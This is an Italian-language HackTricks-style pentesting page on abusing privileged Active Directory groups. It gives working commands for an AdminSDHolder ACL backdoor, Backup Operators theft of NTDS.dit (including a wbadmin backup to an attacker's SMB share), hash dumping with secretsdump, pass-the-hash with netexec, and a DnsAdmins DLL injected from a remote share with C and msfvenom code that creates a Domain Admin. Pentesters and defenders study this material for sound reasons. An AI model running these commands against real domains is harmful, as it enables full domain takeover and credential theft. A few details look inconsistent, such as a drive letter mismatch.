# Gruppi privilegiati

{{#include ../../banners/hacktricks-training.md}}

## Gruppi ben noti con privilegi di amministrazione

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Questo gruppo può creare account e gruppi che non siano amministratori nel dominio. Inoltre, consente l'accesso locale al Domain Controller (DC).

Per identificare i membri di questo gruppo, viene eseguito il seguente comando:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
È consentito aggiungere nuovi utenti, così come l'accesso locale al DC.

## Gruppo AdminSDHolder

L'Access Control List (ACL) del gruppo **AdminSDHolder** è cruciale in quanto definisce i permessi per tutti i "gruppi protetti" all'interno di Active Directory, compresi i gruppi ad alto privilegio. Questo meccanismo garantisce la sicurezza di questi gruppi impedendo modifiche non autorizzate.

Un attaccante potrebbe sfruttare questo modificando l'ACL del gruppo **AdminSDHolder**, concedendo permessi completi a un utente standard. Ciò darebbe effettivamente a quell'utente il controllo totale su tutti i gruppi protetti. Se i permessi di questo utente venissero modificati o rimossi, verrebbero automaticamente ripristinati entro un'ora a causa del funzionamento del sistema.

I comandi per esaminare i membri e modificare i permessi includono:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Uno script è disponibile per accelerare il processo di ripristino: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Per maggiori dettagli, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Cestino di Active Directory

L'appartenenza a questo gruppo permette la lettura degli oggetti eliminati di Active Directory, che possono rivelare informazioni sensibili:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Accesso al Domain Controller

L'accesso ai file sul DC è limitato a meno che l'utente non faccia parte del gruppo `Server Operators`, che modifica il livello di accesso.

### Escalation dei privilegi

Usando `PsService` o `sc` di Sysinternals, è possibile ispezionare e modificare le autorizzazioni dei servizi. Il gruppo `Server Operators`, per esempio, ha il controllo completo su certi servizi, permettendo l'esecuzione di comandi arbitrari e l'escalation dei privilegi:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Questo comando rivela che `Server Operators` hanno accesso completo, consentendo la manipolazione dei servizi per ottenere elevated privileges.

## Backup Operators

L'appartenenza al gruppo `Backup Operators` fornisce accesso al file system di `DC01` grazie ai privilegi `SeBackup` e `SeRestore`. Questi privilegi permettono l'attraversamento delle cartelle, l'elenco e la copia dei file, anche senza permessi espliciti, utilizzando il flag `FILE_FLAG_BACKUP_SEMANTICS`. È necessario utilizzare script specifici per questo processo.

Per elencare i membri del gruppo, eseguire:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attacco locale

Per sfruttare localmente questi privilegi, vengono impiegati i seguenti passaggi:

1. Importare le librerie necessarie:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Abilitare e verificare `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accedere e copiare file da directory protette, ad esempio:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

L'accesso diretto al file system del Domain Controller consente il furto del database `NTDS.dit`, che contiene tutti gli hash NTLM degli utenti e dei computer del dominio.

#### Using diskshadow.exe

1. Crea una shadow copy del drive `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copia `NTDS.dit` dalla shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
In alternativa, usa `robocopy` per copiare file:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Estrai `SYSTEM` e `SAM` per recuperare gli hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recupera tutti gli hash da `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-estrazione: Pass-the-Hash a DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Uso di wbadmin.exe

1. Configura un filesystem NTFS per SMB server sulla attacker machine e memorizza in cache le credenziali SMB sulla target machine.
2. Usa `wbadmin.exe` per il backup di sistema e l'estrazione di `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Per una dimostrazione pratica, vedi [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi SYSTEM su un DNS server, spesso ospitato su Domain Controllers. Questa capacità consente un significativo potenziale di sfruttamento.

Per elencare i membri del gruppo DnsAdmins, usa:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Eseguire una DLL arbitraria (CVE‑2021‑40469)

> [!NOTE]
> Questa vulnerabilità permette l'esecuzione di codice arbitrario con privilegi SYSTEM nel servizio DNS (di solito all'interno dei DC). Il problema è stato corretto nel 2021.

I membri del gruppo Members possono far caricare al server DNS una DLL arbitraria (sia localmente che da una condivisione remota) usando comandi come:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Il riavvio del servizio DNS (che potrebbe richiedere permessi aggiuntivi) è necessario affinché la DLL venga caricata:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Per maggiori dettagli su questo vettore di attacco, fai riferimento a ired.team.

#### Mimilib.dll

È anche possibile utilizzare mimilib.dll per l'esecuzione di comandi, modificandolo per eseguire comandi specifici o reverse shell. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### Record WPAD per MitM

I membri di DnsAdmins possono manipolare i record DNS per eseguire attacchi Man-in-the-Middle (MitM) creando un record WPAD dopo aver disabilitato la global query block list. Strumenti come Responder o Inveigh possono essere usati per lo spoofing e la cattura del traffico di rete.

### Event Log Readers
I membri possono accedere ai registri eventi, potenzialmente trovando informazioni sensibili come password in chiaro o dettagli sull'esecuzione di comandi:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Questo gruppo può modificare le DACLs sull'oggetto di dominio, potenzialmente concedendo privilegi DCSync. Le tecniche per l'elevazione dei privilegi che sfruttano questo gruppo sono dettagliate nel repository Exchange-AD-Privesc su GitHub.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators hanno pieno accesso a Hyper-V, il che può essere sfruttato per ottenere il controllo sui Domain Controllers virtualizzati. Ciò include il clonare DC attivi e l'estrazione di hash NTLM dal file NTDS.dit.

### Esempio di sfruttamento

Il Mozilla Maintenance Service di Firefox può essere sfruttato da Hyper-V Administrators per eseguire comandi come SYSTEM. Ciò comporta la creazione di un hard link verso un file SYSTEM protetto e la sua sostituzione con un eseguibile malevolo:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: Hard link exploitation è stato mitigato nei recenti aggiornamenti di Windows.

## Group Policy Creators Owners

Questo gruppo permette ai membri di creare Group Policies nel dominio. Tuttavia, i suoi membri non possono applicare group policies a utenti o gruppi né modificare i GPO esistenti.

## Organization Management

In ambienti in cui **Microsoft Exchange** è distribuito, un gruppo speciale noto come **Organization Management** possiede capacità significative. Questo gruppo ha il privilegio di **accedere alle cassette postali di tutti gli utenti del dominio** e mantiene il **controllo completo sull'OU 'Microsoft Exchange Security Groups'**. Questo controllo include il gruppo **`Exchange Windows Permissions`**, che può essere sfruttato per l'elevazione di privilegi.

### Privilege Exploitation and Commands

#### Print Operators

I membri del gruppo **Print Operators** sono dotati di diversi privilegi, incluso **`SeLoadDriverPrivilege`**, che permette loro di **accedere localmente a un Domain Controller**, spegnerlo e gestire le stampanti. Per sfruttare questi privilegi, soprattutto se **`SeLoadDriverPrivilege`** non è visibile da un contesto non elevato, è necessario bypassare User Account Control (UAC).

Per elencare i membri di questo gruppo, si usa il seguente comando PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Per tecniche di exploitation più dettagliate relative a **`SeLoadDriverPrivilege`**, è consigliabile consultare risorse di sicurezza specifiche.

#### Utenti Desktop Remoto

I membri di questo gruppo hanno accesso ai PC tramite Remote Desktop Protocol (RDP). Per enumerare questi membri, sono disponibili comandi PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Ulteriori approfondimenti su come sfruttare RDP si trovano in risorse dedicate al pentesting.

#### Remote Management Users

I membri possono accedere ai PC tramite **Windows Remote Management (WinRM)**. L'enumerazione di questi membri viene effettuata mediante:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Per le tecniche di exploitation relative a **WinRM**, consultare la documentazione specifica.

#### Server Operators

Questo gruppo ha i permessi per effettuare varie configurazioni sui controller di dominio, inclusi i privilegi di backup e ripristino, la modifica dell'ora di sistema e l'arresto del sistema. Per enumerare i membri, il comando fornito è:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Riferimenti <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
